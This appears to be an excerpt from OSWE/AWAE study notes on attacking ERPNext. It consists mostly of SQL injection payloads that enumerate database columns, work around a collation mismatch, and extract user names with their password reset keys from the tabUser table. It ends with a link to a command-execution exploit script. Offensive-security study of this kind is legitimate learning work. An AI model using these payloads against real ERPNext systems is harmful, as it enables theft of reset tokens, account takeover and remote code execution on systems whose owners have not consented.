...
#### Injection Payload: `offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#`
...
#### Injection Payload: `offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#`
...
#### Injection Payload: `offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#`
...
#### Injection Payload: `offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#`
...
#### Injection Payload: `offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#`
...
**Exploitation Script:** https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ERPNext/cmd_exec.py
